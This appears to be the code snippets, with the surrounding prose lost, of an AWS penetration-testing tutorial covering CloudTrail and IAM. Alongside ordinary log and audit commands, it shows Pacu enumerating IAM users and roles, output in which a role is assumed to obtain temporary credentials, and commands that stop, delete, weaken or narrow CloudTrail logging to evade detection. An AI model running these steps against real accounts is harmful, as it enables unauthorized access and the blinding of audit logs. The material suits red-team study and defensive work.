["```\n aws cloudtrail describe-trails --include-shadow-trails \n```", "```\naws cloudtrail get-event-selectors --trail-name ExampleTrail --region us-east-1 \n```", "```\n{\n    \"TrailARN\": \"arn:aws:cloudtrail:us-east-1:000000000000:trail/ExampleTrail\",\n    \"EventSelectors\": [\n        {\n            \"ReadWriteType\": \"All\",\n            \"IncludeManagementEvents\": true,\n            \"DataResources\": [\n                {\n                    \"Type\": \"AWS::S3::Object\",\n                    \"Values\": [\n                        \"arn:aws:s3:::bucket-for-lambda-pentesting/\"\n                    ]\n                },\n                {\n                    \"Type\": \"AWS::Lambda::Function\",\n                    \"Values\": [\n                        \"arn:aws:lambda\"\n                    ]\n                }\n            ]\n        }\n    ]\n}\n```", "```\naws cloudtrail get-trail-status --name ExampleTrail --region us-east-1 \n```", "```\n{\n    \"IsLogging\": true,\n    \"LatestDeliveryTime\": 1546030831.039,\n    \"StartLoggingTime\": 1546027671.808,\n    \"LatestDigestDeliveryTime\": 1546030996.935,\n    \"LatestDeliveryAttemptTime\": \"2018-12-28T21:00:31Z\",\n    \"LatestNotificationAttemptTime\": \"\",\n    \"LatestNotificationAttemptSucceeded\": \"\",\n    \"LatestDeliveryAttemptSucceeded\": \"2018-12-28T21:00:31Z\",\n    \"TimeLoggingStarted\": \"2018-12-28T20:07:51Z\",\n    \"TimeLoggingStopped\": \"\"\n}\n```", "```\n{\n    \"eventVersion\": \"1.06\",\n    \"userIdentity\": {\n        \"type\": \"IAMUser\",\n        \"principalId\": \"AIDARACQ1TW2RMLLAQFTX\",\n        \"arn\": \"arn:aws:iam::000000000000:user/TestUser\",\n        \"accountId\": \"000000000000\",\n        \"accessKeyId\": \"ASIAQA94XB3P0PRUSFZ2\",\n        \"userName\": \"TestUser\",\n        \"sessionContext\": {\n            \"attributes\": {\n                \"creationDate\": \"2018-12-28T18:49:59Z\",\n                \"mfaAuthenticated\": \"true\"\n            }\n        },\n        \"invokedBy\": \"signin.amazonaws.com\"\n    },\n    \"eventTime\": \"2018-12-28T20:07:51Z\",\n    \"eventSource\": \"cloudtrail.amazonaws.com\",\n    \"eventName\": \"CreateTrail\",\n    \"awsRegion\": \"us-east-1\",\n    \"sourceIPAddress\": \"1.1.1.1\",\n    \"userAgent\": \"signin.amazonaws.com\",\n    \"requestParameters\": {\n        \"name\": \"ExampleTrail\",\n        \"s3BucketName\": \"example-for-cloudtrail-logs\",\n        \"s3KeyPrefix\": \"\",\n        \"includeGlobalServiceEvents\": true,\n        \"isMultiRegionTrail\": true,\n        \"enableLogFileValidation\": true,\n        \"kmsKeyId\": \"arn:aws:kms:us-east-1:000000000000:key/4a9238p0-r4j7-103i-44hv-l457396t3s9t\",\n        \"isOrganizationTrail\": false\n    },\n    \"responseElements\": {\n        \"name\": \"ExampleTrail\",\n        \"s3BucketName\": \"example-for-cloudtrail-logs\",\n        \"s3KeyPrefix\": \"\",\n        \"includeGlobalServiceEvents\": true,\n        \"isMultiRegionTrail\": true,\n        \"trailARN\": \"arn:aws:cloudtrail:us-east-1:000000000000:trail/ExampleTrail\",\n        \"logFileValidationEnabled\": true,\n        \"kmsKeyId\": \"arn:aws:kms:us-east-1:000000000000:key/4a9238p0-r4j7-103i-44hv-l457396t3s9t\",\n        \"isOrganizationTrail\": false\n    },\n    \"requestID\": \"a27t225a-4598-0031-3829-e5h130432279\",\n    \"eventID\": \"173ii438-1g59-2815-ei8j-w24091jk3p88\",\n    \"readOnly\": false,\n    \"eventType\": \"AwsApiCall\",\n    \"managementEvent\": true,\n    \"recipientAccountId\": \"000000000000\"\n}\n```", "```\n{\n    \"eventVersion\": \"1.06\",\n    \"userIdentity\": {\n        \"type\": \"IAMUser\",\n        \"principalId\": \"AIDARACQ1TW2RMLLAQFTX\",\n        \"arn\": \"arn:aws:iam::000000000000:user/TestUser\",\n        \"accountId\": \"000000000000\",\n        \"accessKeyId\": \"AKIAFGVRRHYEFLLDHVVEA\",\n        \"userName\": \"TestUser\"\n    },\n    \"eventTime\": \"2018-12-28T20:57:17Z\",\n    \"eventSource\": \"cloudtrail.amazonaws.com\",\n    \"eventName\": \"GetEventSelectors\",\n    \"awsRegion\": \"us-east-1\",\n    \"sourceIPAddress\": \"1.1.1.1\",\n    \"userAgent\": \"aws-cli/1.16.81 Python/3.7.0 Windows/10 botocore/1.12.71\",\n    \"requestParameters\": {\n        \"trailName\": \"ExampleTrail\"\n    },\n    \"responseElements\": null,\n    \"requestID\": \"f391ba17-519x-423r-8b1t-16488a26b02p\",\n    \"eventID\": \"562b2177-1ra0-2561-fjm0-3f1app6ac375\",\n    \"readOnly\": true,\n    \"eventType\": \"AwsApiCall\",\n    \"managementEvent\": true,\n    \"recipientAccountId\": \"000000000000\"\n}\n```", "```\naws iam get-credential-report \n```", "```\naws iam generate-service-last-accessed-details --arn arn:aws:iam::000000000000:user/TestUser \n```", "```\naws iam get-service-last-accessed-details --job-id frt7ll81-9002-4371-0829-35t1927k30w2 \n```", "```\nAn error occurred (AccessDeniedException) when calling the ListApps operation: User: arn:aws:iam::000000000000:user/TestUser is not authorized to perform: amplify:ListApps on resource: arn:aws:amplify:us-west-2:000000000000:apps/* \n```", "```\nrun iam__enum_users --account-id 000000000000 --role-name TestRole \n```", "```\nPacu (Demo:imported-default) > run iam__enum_users --account-id 000000000000 --role-name TestRole\n  Running module iam__enum_users...\n[iam__enum_users] Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name!\n\n[iam__enum_users] Targeting account ID: 000000000000\n\n[iam__enum_users] Starting user enumeration...\n\n[iam__enum_users]   Found user: arn:aws:iam::000000000000:user/Alexa\n[iam__enum_users]   Found user: arn:aws:iam::000000000000:user/Test\n\n[iam__enum_users] Found 2 user(s):\n\n[iam__enum_users]     arn:aws:iam::000000000000:user/Alexa\n[iam__enum_users]     arn:aws:iam::000000000000:user/Test\n\n[iam__enum_users] iam__enum_users completed.\n\n[iam__enum_users] MODULE SUMMARY:\n\n  2 user(s) found after 7 guess(es).\n```", "```\n run iam__enum_roles --account-id 000000000000 --role-name TestRole \n```", "```\nPacu (Spencer:imported-default) > run iam__enum_roles --account-id 000000000000 --role-name TestRole \n  Running module iam__enum_roles... \n[iam__enum_roles] Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they \nare allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name and are allowed to use sts:AssumeRole to try and assume any enumerated roles! \n\n[iam__enum_roles] Targeting account ID: 000000000000 \n\n[iam__enum_roles] Starting role enumeration... \n\n[iam__enum_roles]   Found role: arn:aws:iam::000000000000:role/service-role/AmazonAppStreamServiceAccess \n[iam__enum_roles]   Found role: arn:aws:iam::000000000000:role/CodeDeploy \n[iam__enum_roles]   Found role: arn:aws:iam::000000000000:role/SSM \n\n[iam__enum_roles] Found 3 role(s): \n\n[iam__enum_roles]     arn:aws:iam::000000000000:role/service-role/AmazonAppStreamServiceAccess \n[iam__enum_roles]     arn:aws:iam::000000000000:role/CodeDeploy \n[iam__enum_roles]     arn:aws:iam::000000000000:role/SSM \n\n[iam__enum_roles] Checking to see if any of these roles can be assumed for temporary credentials... \n\n[iam__enum_roles]   Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour... \n\n[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::000000000000:role/CodeDeploy \n\n[iam__enum_roles] { \n  \"Credentials\": { \n    \"AccessKeyId\": \"ASIATR17AL2P90OB3U6Z\", \n    \"SecretAccessKey\": \"nIll8wr/T60pbbeIY/hkqRQlC9njUzv3RKO3qznT\", \n    \"SessionToken\": \"FQoGAR<snip>iC/aET\", \n    \"Expiration\": \"2019-01-16 20:32:08+00:00\" \n  }, \n  \"AssumedRoleUser\": { \n    \"AssumedRoleId\": \"AROAJ9266LEYEV7DH1LLK:qw9YWcRjmAiunsp3KhHM\", \n    \"Arn\": \"arn:aws:sts::000000000000:assumed-role/CodeDeploy/qw9YWcRjmAiunsp3KhHM\" \n  } \n} \n[iam__enum_roles] iam__enum_roles completed. \n\n[iam__enum_roles] MODULE SUMMARY: \n\n  3 role(s) found after 8 guess(es). \n  1 out of 3 enumerated role(s) successfully assumed. \n```", "```\naws cloudtrail stop-logging --name test \n```", "```\n run detection__disruption --trails test@us-east-1 \n```", "```\naws cloudtrail delete-trail --name test \n```", "```\nrun detection__disruption --trails test@us-east-1 \n```", "```\naws cloudtrail describe-trails \n```", "```\naws s3api delete-bucket --bucket cloudtrail_bucket\n```", "```\naws cloudtrail update-trail --name test --no-include-global-service-events --no-is-multi-region-trail --no-enable-log-file-validation --kms-key-id \"\" \n```", "```\nrun detection__disruption --trails test@us-east-1 \n```", "```\naws cloudtrail put-event-selectors --trail-name Test --event-selectors file://event_selectors.json\n```", "```\n[\n    {\n        \"ReadWriteType\": \"ReadOnly\",\n        \"IncludeManagementEvents\": true,\n        \"DataResources\": []\n    }\n]\n```"]